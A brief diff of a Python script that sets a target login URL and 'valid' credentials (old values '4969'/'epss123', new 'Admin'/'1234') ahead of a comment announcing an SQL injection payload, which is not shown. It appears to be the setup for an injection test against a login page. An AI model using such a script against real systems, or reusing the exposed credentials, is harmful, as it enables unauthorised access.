@@ -1,12 +1,12 @@
 import requests
 
 # Target login URL
-url = "http://172.16.250.15:8080/help/login.php"
+url = "http://172.168.10.20:8081/help/loginn.php"
 
 # Normal login attempt with valid credentials
 normal_payload = {
-    "username": "4969",
-    "password": "epss123"
+    "username": "Admin",
+    "password": "1234"
 }
 
 # SQL injection payload
